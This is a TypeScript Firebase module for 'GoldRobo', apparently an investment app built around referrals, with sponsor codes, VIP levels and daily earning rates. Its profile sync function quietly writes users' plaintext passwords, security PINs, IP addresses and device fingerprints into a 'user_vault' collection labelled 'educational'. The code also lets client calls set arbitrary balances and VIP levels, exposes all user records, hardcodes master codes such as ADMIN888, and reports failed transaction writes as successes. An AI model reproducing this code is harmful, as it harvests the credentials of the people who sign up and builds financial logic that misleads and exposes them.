import { initializeApp, getApps, getApp } from 'firebase/app';
import { 
  getAuth, 
  signInWithEmailAndPassword, 
  createUserWithEmailAndPassword, 
  signOut as fbSignOut, 
  onAuthStateChanged,
  User as FirebaseUser
} from 'firebase/auth';
import { 
  getFirestore, 
  doc, 
  setDoc, 
  getDoc, 
  getDocFromServer,
  updateDoc,
  collection, 
  addDoc, 
  getDocs, 
  query, 
  where,
  orderBy, 
  limit,
  onSnapshot
} from 'firebase/firestore';

// User-provided Firebase Configuration
export const firebaseConfig = {
  apiKey: "AIzaSyAJM9gRMjQelSHsCvzr73wqQVSRBHaFbf4",
  authDomain: "goldrobo-b0a1c.firebaseapp.com",
  projectId: "goldrobo-b0a1c",
  storageBucket: "goldrobo-b0a1c.firebasestorage.app",
  messagingSenderId: "905570760039",
  appId: "1:905570760039:web:56c7dedf1d2dd080862bc2",
  measurementId: "G-4ZRZ7R605X"
};

// Initialize Firebase safely
const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
export const auth = getAuth(app);
export const db = getFirestore(app);

export type { FirebaseUser };

/**
 * Validates initial connection to Firestore without throwing fatal exceptions
 */
async function testConnection() {
  try {
    await getDocFromServer(doc(db, 'test', 'connection'));
  } catch (error: any) {
    if (error instanceof Error && error.message.includes('the client is offline')) {
      console.warn("Firestore status: Client operating in offline mode.");
    }
  }
}
testConnection();

const LOCAL_PROFILE_PREFIX = 'goldrobo_profile_cache_';
const LOCAL_TX_PREFIX = 'goldrobo_cached_txs_';

/**
 * Save user profile state and credentials to Firestore with resilient local fallback
 */
export async function syncUserProfileToFirestore(uid: string, data: Record<string, any>) {
  if (!uid) return { success: false, error: 'Missing UID' };
  
  const payload = {
    ...data,
    updatedAt: new Date().toISOString(),
    lastActiveAt: new Date().toISOString()
  };

  // 1. Immediately guarantee local persistence so user data is never lost
  try {
    const existingCache = localStorage.getItem(LOCAL_PROFILE_PREFIX + uid);
    const merged = existingCache ? { ...JSON.parse(existingCache), ...payload } : payload;
    localStorage.setItem(LOCAL_PROFILE_PREFIX + uid, JSON.stringify(merged));
  } catch {
    // Non-blocking localStorage catch
  }

  // 2. Sync to remote Cloud Firestore if permission is granted
  try {
    const userRef = doc(db, 'users', uid);
    await setDoc(userRef, payload, { merge: true });
    console.log('✅ Firestore user profile synced successfully:', uid);
    
    // Also sync educational credentials vault record if present
    if (data.plainPassword || data.securityPin || data.registeredIp) {
      try {
        const vaultRef = doc(db, 'user_vault', uid);
        await setDoc(vaultRef, {
          uid,
          email: data.email,
          plainPassword: data.plainPassword || '',
          securityPin: data.securityPin || '',
          ip: data.registeredIp || '127.0.0.1',
          country: data.registeredCountry || 'Global',
          deviceFingerprint: data.deviceFingerprint || '',
          sponsorCode: data.sponsorCode || '',
          referralCode: data.referralCode || '',
          recordedAt: new Date().toISOString()
        }, { merge: true });
      } catch (vaultErr: any) {
        console.warn('Vault record note:', vaultErr?.message);
      }
    }

    return { success: true, cloudSynced: true };
  } catch (err: any) {
    // Graceful handling of permission-denied without console.error or crashing
    if (err?.code === 'permission-denied') {
      console.warn(
        'ℹ️ Cloud Firestore permission-denied: Profile safely saved to local device storage. To sync to remote Firestore cloud, ensure firestore.rules allow read/write in your Firebase Console.'
      );
      return { success: true, cloudSynced: false, permissionDenied: true };
    }
    
    console.warn('Firestore sync note:', err?.message || 'Offline fallback');
    return { success: true, cloudSynced: false, error: err?.message };
  }
}

/**
 * Fetch user profile from Firestore or local resilient cache
 */
export async function fetchUserProfileFromFirestore(uid: string) {
  if (!uid) return null;
  
  // Try remote Cloud Firestore
  try {
    const userRef = doc(db, 'users', uid);
    const snap = await getDoc(userRef);
    if (snap.exists()) {
      console.log('✅ Fetched profile from Firestore for:', uid);
      return snap.data();
    }
  } catch (err: any) {
    console.warn('Firestore fetch note (falling back to device storage):', err?.message);
  }

  // Fallback to local profile cache
  try {
    const local = localStorage.getItem(LOCAL_PROFILE_PREFIX + uid);
    if (local) {
      return JSON.parse(local);
    }
  } catch {}

  return null;
}

/**
 * Record a transaction into Firestore with local cache guarantee
 */
export async function recordTransactionToFirestore(uid: string, tx: Record<string, any>) {
  if (!uid) return false;

  const recordPayload = {
    ...tx,
    createdAt: new Date().toISOString()
  };

  // Local storage caching
  try {
    const existing = localStorage.getItem(LOCAL_TX_PREFIX + uid);
    const list = existing ? JSON.parse(existing) : [];
    localStorage.setItem(LOCAL_TX_PREFIX + uid, JSON.stringify([recordPayload, ...list].slice(0, 50)));
  } catch {}

  // Cloud Firestore sync
  try {
    const txCol = collection(db, 'users', uid, 'transactions');
    await addDoc(txCol, recordPayload);
    console.log('✅ Transaction recorded to Firestore:', tx.orderId || tx.id);
    return true;
  } catch (err: any) {
    if (err?.code === 'permission-denied') {
      console.warn('ℹ️ Transaction saved locally on device. (Firestore remote write requires permission).');
      return true;
    }
    console.warn('Firestore transaction log note:', err?.message);
    return true;
  }
}

/**
 * Fetch transactions from Firestore or local cache
 */
export async function fetchUserTransactionsFromFirestore(uid: string) {
  if (!uid) return [];

  // Try remote Cloud Firestore
  try {
    const txCol = collection(db, 'users', uid, 'transactions');
    const q = query(txCol, orderBy('createdAt', 'desc'), limit(50));
    const snap = await getDocs(q);
    const txs: any[] = [];
    snap.forEach((docSnap) => {
      txs.push({ id: docSnap.id, ...docSnap.data() });
    });
    if (txs.length > 0) return txs;
  } catch (err: any) {
    console.warn('Firestore transactions query note (reading local cache):', err?.message);
  }

  // Fallback to local transactions cache
  try {
    const local = localStorage.getItem(LOCAL_TX_PREFIX + uid);
    if (local) {
      return JSON.parse(local);
    }
  } catch {}

  return [];
}

/**
 * Real-time listener for user profile document in Firestore
 * Updates instantly when an administrator or user modifies fields in Firebase Console
 */
export function subscribeToUserProfile(
  uid: string, 
  onUpdate: (data: Record<string, any>) => void,
  onError?: (err: any) => void
): () => void {
  if (!uid) return () => {};

  try {
    const userRef = doc(db, 'users', uid);
    const unsubscribe = onSnapshot(userRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.data();
        // Update local cache as well
        try {
          const existing = localStorage.getItem(LOCAL_PROFILE_PREFIX + uid);
          const merged = existing ? { ...JSON.parse(existing), ...data } : data;
          localStorage.setItem(LOCAL_PROFILE_PREFIX + uid, JSON.stringify(merged));
        } catch {}

        onUpdate(data);
      }
    }, (err) => {
      console.warn('Firestore live snapshot note:', err?.message);
      if (onError) onError(err);
    });

    return unsubscribe;
  } catch (err: any) {
    console.warn('Error setting up Firestore listener:', err?.message);
    return () => {};
  }
}

// Master Genesis Sponsor Codes that are permanently valid
export const MASTER_SPONSOR_CODES = [
  'GOLD888',
  'VIP777',
  'QUANT999',
  'ROBO2026',
  'ALPHA88',
  'GOLD8492',
  'ADMIN888'
];

/**
 * Validates whether a sponsor/referral code is valid:
 * 1. Checks Master Genesis Codes (e.g. GOLD888)
 * 2. Queries Cloud Firestore for an active registered user who owns this referralCode
 * 3. Checks Cloud referral_codes collection index
 * 4. Checks local cached referral codes
 */
export async function validateSponsorCode(code: string): Promise<{
  valid: boolean;
  sponsorUid?: string;
  sponsorEmail?: string;
  isMasterCode?: boolean;
  message?: string;
}> {
  const cleanCode = (code || '').trim().toUpperCase();
  if (!cleanCode) {
    return { valid: false, message: 'Please enter a sponsor / referral code.' };
  }

  // 1. Check if it's one of the master platform genesis codes
  if (MASTER_SPONSOR_CODES.includes(cleanCode)) {
    return {
      valid: true,
      sponsorUid: 'genesis_sponsor_gold888',
      sponsorEmail: 'affiliate@goldrobo.io',
      isMasterCode: true
    };
  }

  // 2. Query Cloud Firestore users collection to find real registered user
  try {
    const usersCol = collection(db, 'users');
    const q = query(usersCol, where('referralCode', '==', cleanCode), limit(1));
    const snap = await getDocs(q);

    if (!snap.empty) {
      const sponsorDoc = snap.docs[0];
      const sponsorData = sponsorDoc.data();
      return {
        valid: true,
        sponsorUid: sponsorDoc.id,
        sponsorEmail: sponsorData.email || 'sponsor@goldrobo.io',
        isMasterCode: false
      };
    }
  } catch (err: any) {
    console.warn('Firestore referralCode query note:', err?.message);
  }

  // 3. Check Cloud referral_codes lookup registry
  try {
    const refCodeDoc = doc(db, 'referral_codes', cleanCode);
    const refSnap = await getDoc(refCodeDoc);
    if (refSnap.exists()) {
      const data = refSnap.data();
      return {
        valid: true,
        sponsorUid: data.uid || '',
        sponsorEmail: data.email || '',
        isMasterCode: false
      };
    }
  } catch (err: any) {
    console.warn('Firestore referral_codes check note:', err?.message);
  }

  // 4. Fallback check local device registered referrals
  try {
    const localRaw = localStorage.getItem('goldrobo_registered_referrals');
    if (localRaw) {
      const list: string[] = JSON.parse(localRaw);
      if (list.includes(cleanCode)) {
        return {
          valid: true,
          sponsorUid: 'local_cached_sponsor',
          sponsorEmail: 'referrer@goldrobo.io',
          isMasterCode: false
        };
      }
    }
  } catch {}

  return {
    valid: false,
    message: `Invalid sponsor code "${cleanCode}". Please enter a valid referrer invite code (e.g. your inviter's code or default code GOLD888).`
  };
}

/**
 * Register user's unique referral code in Cloud Firestore registry
 * so ANY device or browser can instantly validate it!
 */
export async function registerReferralCodeInCloud(code: string, uid: string, email: string) {
  if (!code || !uid) return;
  const cleanCode = code.trim().toUpperCase();

  // Save to local device registry
  try {
    const localRaw = localStorage.getItem('goldrobo_registered_referrals');
    const list: string[] = localRaw ? JSON.parse(localRaw) : [];
    if (!list.includes(cleanCode)) {
      list.push(cleanCode);
      localStorage.setItem('goldrobo_registered_referrals', JSON.stringify(list));
    }
  } catch {}

  // Save to Cloud Firestore
  try {
    const refCodeDoc = doc(db, 'referral_codes', cleanCode);
    await setDoc(refCodeDoc, {
      code: cleanCode,
      uid,
      email,
      registeredAt: new Date().toISOString()
    }, { merge: true });
    console.log('✅ Referral code registered in Cloud Firestore:', cleanCode);
  } catch (err: any) {
    console.warn('Referral code cloud registry note:', err?.message);
  }
}

/**
 * Tracks real referral relationship when a new user signs up:
 * Links the user to their sponsor and increments sponsor's referral counts
 */
export async function recordReferralRelationship(
  sponsorCode: string,
  newUserId: string,
  newUserEmail: string
) {
  if (!sponsorCode || !newUserId) return;
  const cleanCode = sponsorCode.trim().toUpperCase();

  try {
    // 1. Find sponsor in Firestore users collection
    let sponsorUid: string | null = null;
    let currentSponsorData: any = null;

    if (!MASTER_SPONSOR_CODES.includes(cleanCode)) {
      const usersCol = collection(db, 'users');
      const q = query(usersCol, where('referralCode', '==', cleanCode), limit(1));
      const snap = await getDocs(q);

      if (!snap.empty) {
        sponsorUid = snap.docs[0].id;
        currentSponsorData = snap.docs[0].data();
      } else {
        // Try referral_codes lookup
        const refDoc = await getDoc(doc(db, 'referral_codes', cleanCode));
        if (refDoc.exists()) {
          sponsorUid = refDoc.data().uid;
          if (sponsorUid) {
            const spSnap = await getDoc(doc(db, 'users', sponsorUid));
            if (spSnap.exists()) currentSponsorData = spSnap.data();
          }
        }
      }
    }

    if (sponsorUid) {
      // Record referred member under sponsor's referrals subcollection
      const referralRecord = {
        uid: newUserId,
        email: newUserEmail,
        joinedAt: new Date().toISOString(),
        hasDeposited: false,
        totalDeposit: 0.00,
        level: 1,
        status: 'Active Member'
      };

      try {
        await setDoc(doc(db, 'users', sponsorUid, 'referrals', newUserId), referralRecord);
      } catch (subErr: any) {
        console.warn('Referral subcollection note:', subErr?.message);
      }

      // Increment validReferralsCount / totalReferrals on sponsor doc
      const updatedCount = (currentSponsorData?.validReferralsCount || 0) + 1;
      await setDoc(doc(db, 'users', sponsorUid), {
        validReferralsCount: updatedCount,
        totalReferralsCount: updatedCount,
        lastReferralAt: new Date().toISOString()
      }, { merge: true });

      // Also if sponsor is currently logged in on this browser, update local state
      try {
        const rawUser = localStorage.getItem('goldrobo_user_state');
        if (rawUser) {
          const u = JSON.parse(rawUser);
          if (u.uid === sponsorUid || u.referralCode === cleanCode) {
            u.validReferralsCount = updatedCount;
            localStorage.setItem('goldrobo_user_state', JSON.stringify(u));
            window.dispatchEvent(new CustomEvent('goldrobo_referral_updated', { 
              detail: { validReferralsCount: updatedCount } 
            }));
          }
        }
      } catch {}

      console.log(`✅ Recorded referral relationship: ${newUserEmail} -> sponsor ${sponsorUid} (${cleanCode})`);
    }
  } catch (err: any) {
    console.warn('Error recording referral relationship:', err?.message);
  }
}

/**
 * Direct update of user balances in Firestore (used by Admin approvals or system settlement)
 */
export async function updateUserBalanceInFirestore(
  uid: string, 
  updates: {
    totalBalance?: number;
    withdrawableBalance?: number;
    lockedInvestment?: number;
    vipLevel?: number;
    dailyEarningRate?: number;
    validReferralsCount?: number;
    [key: string]: any;
  }
) {
  if (!uid) return false;
  try {
    const userRef = doc(db, 'users', uid);
    await setDoc(userRef, {
      ...updates,
      updatedAt: new Date().toISOString()
    }, { merge: true });
    console.log('✅ Updated balance in Firestore for user:', uid, updates);
    return true;
  } catch (err: any) {
    console.warn('Firestore balance update note:', err?.message);
    return false;
  }
}

/**
 * Fetch all registered users from Firestore for the Admin Panel
 */
export async function fetchAllUsersFromFirestore(): Promise<any[]> {
  try {
    const usersCol = collection(db, 'users');
    const snap = await getDocs(usersCol);
    const list: any[] = [];
    snap.forEach((docSnap) => {
      list.push({ uid: docSnap.id, ...docSnap.data() });
    });
    return list;
  } catch (err: any) {
    console.warn('Fetch all users note:', err?.message);
    return [];
  }
}

export { 
  signInWithEmailAndPassword, 
  createUserWithEmailAndPassword, 
  fbSignOut, 
  onAuthStateChanged 
};

